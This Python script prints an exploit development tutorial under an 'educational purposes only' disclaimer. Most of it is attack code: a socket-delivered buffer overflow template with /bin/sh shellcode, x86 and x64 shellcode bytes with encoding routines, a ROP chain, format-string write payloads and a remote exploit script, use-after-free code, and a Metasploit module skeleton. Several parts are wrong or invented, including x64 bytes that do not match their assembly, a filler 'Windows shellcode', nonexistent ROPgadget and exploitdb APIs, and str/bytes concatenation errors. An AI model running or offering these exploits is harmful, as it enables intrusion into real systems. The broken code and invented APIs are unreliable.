#!/usr/bin/env python3
"""
EDUCATIONAL PURPOSE ONLY - Exploit Development Tutorial
This tutorial demonstrates exploit development techniques for educational and defensive purposes.

LEGAL DISCLAIMER:
This code is for educational purposes only. Use only on systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal and unethical.
"""

import socket
import struct
import sys
import os
import subprocess
import time

class ExploitDevelopment:
    def __init__(self):
        self.shellcode_x86 = None
        self.shellcode_x64 = None
        
    def buffer_overflow_exploit(self):
        """
        Buffer Overflow Exploit Tutorial
        Demonstrates basic buffer overflow exploitation concepts
        """
        print("=== Buffer Overflow Exploit Tutorial ===")
        print("‚ö†Ô∏è  WARNING: This is for educational purposes only!")
        
        print("\n1. Buffer Overflow Concepts:")
        print("   - Buffer overflow occurs when data exceeds allocated buffer size")
        print("   - Can lead to code execution or program crash")
        print("   - Common in C/C++ programs with unsafe functions")
        
        print("\n2. Vulnerable Code Example:")
        vulnerable_code = '''
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // Vulnerable: no bounds checking
    printf("Buffer content: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
'''
        print(vulnerable_code)
        
        print("\n3. Exploitation Steps:")
        print("   a) Find the vulnerable function")
        print("   b) Determine buffer size")
        print("   c) Calculate offset to return address")
        print("   d) Craft payload with shellcode")
        print("   e) Execute exploit")
        
        print("\n4. Python Exploit Template:")
        exploit_template = '''
#!/usr/bin/env python3
import socket
import struct

def create_exploit_payload():
    # Buffer size (determined through analysis)
    buffer_size = 64
    
    # Offset to return address (determined through debugging)
    offset = 76  # Example offset
    
    # Return address (where to jump)
    return_address = struct.pack("<L", 0x41414141)  # Example address
    
    # Shellcode (executes /bin/sh)
    shellcode = (
        "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e"
        "\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
    )
    
    # NOP sled for reliability
    nop_sled = "\\x90" * 100
    
    # Craft payload
    payload = "A" * offset + return_address + nop_sled + shellcode
    
    return payload

def exploit_buffer_overflow(target, port):
    payload = create_exploit_payload()
    
    # Send payload to vulnerable service
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(payload)
    s.close()

if __name__ == "__main__":
    exploit_buffer_overflow("192.168.1.100", 9999)
'''
        print(exploit_template)
    
    def shellcode_development(self):
        """
        Shellcode Development Tutorial
        Demonstrates shellcode creation and optimization
        """
        print("\n=== Shellcode Development Tutorial ===")
        
        print("1. Shellcode Basics:")
        print("   - Machine code that executes shell commands")
        print("   - Must be position-independent")
        print("   - Cannot contain null bytes (\\x00)")
        print("   - Should be as small as possible")
        
        print("\n2. Linux x86 Shellcode (execve /bin/sh):")
        x86_shellcode = '''
; Assembly code for execve("/bin/sh", NULL, NULL)
xor eax, eax        ; eax = 0
push eax            ; push null terminator
push 0x68732f2f     ; push "//sh"
push 0x6e69622f     ; push "/bin"
mov ebx, esp        ; ebx points to "/bin//sh"
push eax            ; push null
push ebx            ; push pointer to "/bin//sh"
mov ecx, esp        ; ecx = [pointer to "/bin//sh", NULL]
mov al, 11          ; execve syscall number
int 0x80            ; system call

; Machine code:
\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e
\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80
'''
        print(x86_shellcode)
        
        print("\n3. Linux x64 Shellcode (execve /bin/sh):")
        x64_shellcode = '''
; Assembly code for execve("/bin/sh", NULL, NULL)
xor rdx, rdx        ; rdx = 0 (third argument)
push rdx            ; push null terminator
mov rax, 0x68732f2f6e69622f  ; "/bin//sh"
push rax            ; push "/bin//sh"
mov rdi, rsp        ; rdi points to "/bin//sh"
push rdx            ; push null
push rdi            ; push pointer to "/bin//sh"
mov rsi, rsp        ; rsi = [pointer to "/bin//sh", NULL]
mov al, 59          ; execve syscall number
syscall             ; system call

; Machine code:
\\x48\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68
\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05
'''
        print(x64_shellcode)
        
        print("\n4. Windows Shellcode (MessageBox):")
        windows_shellcode = '''
; Assembly code for MessageBox(NULL, "Hello World", "Title", MB_OK)
; This is a simplified example - real Windows shellcode is more complex

; Machine code (simplified):
\\x31\\xc9\\x51\\x68\\x48\\x65\\x6c\\x6c\\x6f\\x20\\x57\\x6f\\x72\\x6c\\x64
\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51
\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51
\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51\\x51
'''
        print(windows_shellcode)
        
        print("\n5. Shellcode Encoding and Obfuscation:")
        encoding_techniques = '''
# XOR Encoding
def xor_encode(shellcode, key):
    encoded = []
    for byte in shellcode:
        encoded.append(byte ^ key)
    return encoded

# ROT13 Encoding
def rot13_encode(shellcode):
    encoded = []
    for byte in shellcode:
        if ord('A') <= byte <= ord('Z'):
            encoded.append(((byte - ord('A') + 13) % 26) + ord('A'))
        elif ord('a') <= byte <= ord('z'):
            encoded.append(((byte - ord('a') + 13) % 26) + ord('a'))
        else:
            encoded.append(byte)
    return encoded

# Base64 Encoding
import base64
def base64_encode(shellcode):
    return base64.b64encode(shellcode)
'''
        print(encoding_techniques)
    
    def rop_chain_development(self):
        """
        ROP Chain Development Tutorial
        Demonstrates Return-Oriented Programming
        """
        print("\n=== ROP Chain Development Tutorial ===")
        
        print("1. ROP Basics:")
        print("   - Uses existing code snippets (gadgets) in the binary")
        print("   - Bypasses DEP/NX protection")
        print("   - Chains multiple gadgets together")
        print("   - Each gadget ends with 'ret' instruction")
        
        print("\n2. ROP Gadget Types:")
        gadgets = '''
# Pop gadgets
pop eax; ret        # Load value into eax
pop ebx; ret        # Load value into ebx
pop ecx; ret        # Load value into ecx

# Arithmetic gadgets
add eax, ebx; ret   # eax = eax + ebx
sub eax, ebx; ret   # eax = eax - ebx

# Memory gadgets
mov [eax], ebx; ret # Write ebx to memory at eax
mov eax, [ebx]; ret # Read memory at ebx into eax

# System call gadgets
int 0x80; ret       # Make system call (x86)
syscall; ret        # Make system call (x64)
'''
        print(gadgets)
        
        print("\n3. ROP Chain Example (execve /bin/sh):")
        rop_chain = '''
# ROP chain for execve("/bin/sh", NULL, NULL)

# Gadget addresses (example)
POP_EAX = 0x08048000
POP_EBX = 0x08048004
POP_ECX = 0x08048008
INT_80  = 0x0804800c

# String address
BINSH = 0x08049000  # Address of "/bin/sh" string

# ROP chain
rop_chain = [
    POP_EAX,    # Load syscall number
    11,         # execve syscall number
    POP_EBX,    # Load first argument
    BINSH,      # Pointer to "/bin/sh"
    POP_ECX,    # Load second argument
    0,          # NULL
    INT_80      # Make system call
]

# Convert to bytes
payload = b"".join(struct.pack("<I", addr) for addr in rop_chain)
'''
        print(rop_chain)
        
        print("\n4. ROP Chain Tools:")
        tools = '''
# ROPgadget - Find ROP gadgets
# https://github.com/JonathanSalwan/ROPgadget
from ropgadget import ROPgadget

# Find gadgets in binary
gadgets = ROPgadget.find_gadgets("vulnerable_binary")

# Search for specific gadgets
pop_gadgets = ROPgadget.search_gadgets(gadgets, "pop.*; ret")

# ROPchain - Automated ROP chain generation
# https://github.com/0vercl0k/rp
'''
        print(tools)
    
    def format_string_exploit(self):
        """
        Format String Exploit Tutorial
        Demonstrates format string vulnerabilities
        """
        print("\n=== Format String Exploit Tutorial ===")
        
        print("1. Format String Vulnerability:")
        print("   - Occurs when user input is used as format string")
        print("   - Can read/write arbitrary memory")
        print("   - Common with printf, sprintf, fprintf")
        
        print("\n2. Vulnerable Code Example:")
        vulnerable_code = '''
#include <stdio.h>

int main(int argc, char *argv[]) {
    if (argc > 1) {
        printf(argv[1]);  // Vulnerable: user input as format string
    }
    return 0;
}
'''
        print(vulnerable_code)
        
        print("\n3. Format String Exploitation:")
        exploitation = '''
# Reading memory
payload = "%p %p %p %p"  # Print 4 values from stack
payload = "%x %x %x %x"  # Print 4 hex values from stack
payload = "%s"           # Print string from stack

# Writing memory
payload = "%n"           # Write number of printed chars to stack
payload = "%100c%n"      # Write 100 to stack

# Reading specific memory address
payload = "\\x41\\x41\\x41\\x41%x %x %x %s"  # Read from 0x41414141

# Writing to specific memory address
payload = "\\x41\\x41\\x41\\x41%100c%n"  # Write 100 to 0x41414141
'''
        print(exploitation)
        
        print("\n4. Format String Exploit Script:")
        exploit_script = '''
#!/usr/bin/env python3
import struct
import socket

def format_string_exploit(target, port):
    # Target address to write to
    target_addr = 0x0804a000  # Example address
    
    # Value to write
    value = 0x41414141
    
    # Craft format string payload
    payload = struct.pack("<I", target_addr)
    payload += b"%100c%n"  # Write 100 to target_addr
    
    # Send payload
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.send(payload)
    s.close()

if __name__ == "__main__":
    format_string_exploit("192.168.1.100", 9999)
'''
        print(exploit_script)
    
    def heap_exploitation(self):
        """
        Heap Exploitation Tutorial
        Demonstrates heap-based vulnerabilities
        """
        print("\n=== Heap Exploitation Tutorial ===")
        
        print("1. Heap Vulnerabilities:")
        print("   - Use-after-free")
        print("   - Double-free")
        print("   - Heap overflow")
        print("   - Heap spray")
        
        print("\n2. Use-After-Free Example:")
        uaf_code = '''
#include <stdio.h>
#include <stdlib.h>

struct chunk {
    char *data;
    void (*func_ptr)();
};

void malicious_function() {
    printf("Code execution achieved!\\n");
    system("/bin/sh");
}

int main() {
    struct chunk *ptr1 = malloc(sizeof(struct chunk));
    ptr1->data = malloc(32);
    ptr1->func_ptr = NULL;
    
    // Free the chunk
    free(ptr1);
    
    // Allocate new chunk in same location
    struct chunk *ptr2 = malloc(sizeof(struct chunk));
    ptr2->data = malloc(32);
    ptr2->func_ptr = malicious_function;
    
    // Use-after-free: ptr1 still points to freed memory
    ptr1->func_ptr();  // Calls malicious_function
    
    return 0;
}
'''
        print(uaf_code)
        
        print("\n3. Heap Spray Technique:")
        heap_spray = '''
#!/usr/bin/env python3

def heap_spray_exploit():
    # Allocate many objects to fill heap
    spray_size = 0x1000000  # 16MB
    chunk_size = 0x1000     # 4KB chunks
    
    # Create spray payload
    payload = "A" * chunk_size
    
    # Spray the heap
    for i in range(spray_size // chunk_size):
        # Allocate chunk with payload
        # In real exploit, this would be through vulnerable application
        pass
    
    # Trigger vulnerability to use sprayed heap
    trigger_vulnerability()

def trigger_vulnerability():
    # This would trigger the actual vulnerability
    # that uses the sprayed heap data
    pass
'''
        print(heap_spray)
    
    def exploit_mitigation_bypass(self):
        """
        Exploit Mitigation Bypass Tutorial
        Demonstrates bypassing modern protections
        """
        print("\n=== Exploit Mitigation Bypass Tutorial ===")
        
        print("1. Common Protections:")
        protections = '''
# Stack protections
- Stack Canaries: Detect stack overflow
- Stack Randomization (ASLR): Randomize stack addresses
- Non-executable Stack (NX): Prevent code execution on stack

# Heap protections
- Heap Randomization: Randomize heap addresses
- Heap Canaries: Detect heap overflow
- Fasttop Check: Detect double-free

# Code protections
- Position Independent Executable (PIE): Randomize code addresses
- Control Flow Integrity (CFI): Validate control flow
- Return Address Sanitizer (RAS): Detect return address corruption
'''
        print(protections)
        
        print("\n2. ASLR Bypass Techniques:")
        aslr_bypass = '''
# Information disclosure
- Leak addresses through format strings
- Use relative addressing
- Brute force (limited effectiveness)

# Partial overwrite
- Overwrite only lower bytes of address
- Use known address ranges
- Exploit predictable address patterns

# JIT spraying
- Fill memory with executable code
- Use predictable memory layout
- Exploit JIT compiler behavior
'''
        print(aslr_bypass)
        
        print("\n3. DEP/NX Bypass Techniques:")
        dep_bypass = '''
# Return-to-libc
- Jump to existing library functions
- Chain multiple function calls
- Use system() to execute commands

# Return-Oriented Programming (ROP)
- Use existing code snippets
- Chain gadgets together
- Bypass DEP completely

# JIT spraying
- Fill memory with executable code
- Use predictable memory layout
- Exploit JIT compiler behavior
'''
        print(dep_bypass)
        
        print("\n4. Stack Canary Bypass:")
        canary_bypass = '''
# Information disclosure
- Leak canary value through format string
- Use partial overwrite
- Brute force (limited effectiveness)

# Canary prediction
- Use known canary values
- Exploit predictable patterns
- Use environment-specific canaries

# Canary overwrite
- Overwrite canary with correct value
- Use partial overwrite techniques
- Exploit canary validation bugs
'''
        print(canary_bypass)
    
    def exploit_frameworks(self):
        """
        Exploit Frameworks Tutorial
        Demonstrates popular exploit frameworks
        """
        print("\n=== Exploit Frameworks Tutorial ===")
        
        print("1. Metasploit Framework:")
        metasploit = '''
# Metasploit exploit development
class Exploit < Msf::Exploit::Remote
    Rank = ExcellentRanking
    
    include Msf::Exploit::Remote::Tcp
    
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Vulnerable Service Buffer Overflow',
            'Description'    => %q{
                This module exploits a buffer overflow in vulnerable service.
            },
            'Author'         => ['Your Name'],
            'License'        => MSF_LICENSE,
            'References'     => [['URL', 'http://example.com']],
            'Payload'        => {'Space' => 1024},
            'Platform'       => 'win',
            'Targets'        => [['Windows XP', {}]],
            'DisclosureDate' => 'Jan 01 2024',
            'DefaultTarget'  => 0))
    end
    
    def exploit
        connect
        
        # Craft exploit payload
        payload = make_nops(target['Offset']) + payload.encoded
        
        # Send exploit
        sock.put(payload)
        
        handler
        disconnect
    end
end
'''
        print(metasploit)
        
        print("\n2. Exploit-DB Integration:")
        exploitdb = '''
# Search for exploits
from exploitdb import ExploitDB

edb = ExploitDB()
exploits = edb.search('buffer overflow')

# Download exploit
exploit = edb.download_exploit(12345)

# Execute exploit
exploit.execute(target='192.168.1.100', port=9999)
'''
        print(exploitdb)
        
        print("\n3. Custom Exploit Framework:")
        custom_framework = '''
class ExploitFramework:
    def __init__(self):
        self.targets = []
        self.exploits = []
    
    def add_target(self, host, port, os_type):
        target = {
            'host': host,
            'port': port,
            'os_type': os_type,
            'vulnerabilities': []
        }
        self.targets.append(target)
    
    def add_exploit(self, name, target_os, payload):
        exploit = {
            'name': name,
            'target_os': target_os,
            'payload': payload
        }
        self.exploits.append(exploit)
    
    def run_exploit(self, target, exploit):
        # Execute exploit against target
        pass
    
    def scan_targets(self):
        # Scan all targets for vulnerabilities
        pass
'''
        print(custom_framework)
    
    def run_tutorial(self):
        """
        Run the complete exploit development tutorial
        """
        print("üîí Exploit Development Tutorial - Educational Purpose Only")
        print("=" * 70)
        print("‚ö†Ô∏è  WARNING: This tutorial is for educational purposes only!")
        print("Use only on systems you own or have explicit permission to test.")
        print("=" * 70)
        
        try:
            self.buffer_overflow_exploit()
            self.shellcode_development()
            self.rop_chain_development()
            self.format_string_exploit()
            self.heap_exploitation()
            self.exploit_mitigation_bypass()
            self.exploit_frameworks()
            
        except Exception as e:
            print(f"‚ùå Error during tutorial: {e}")
        
        print("\n" + "=" * 70)
        print("‚úÖ Tutorial completed!")
        print("Remember: Always use these techniques responsibly and legally!")

def main():
    """
    Main function to run exploit development tutorial
    """
    print("Exploit Development Tutorial - Educational Purpose Only")
    print("‚ö†Ô∏è  WARNING: Use only on systems you own or have explicit permission to test!")
    
    tutorial = ExploitDevelopment()
    tutorial.run_tutorial()

if __name__ == "__main__":
    main()

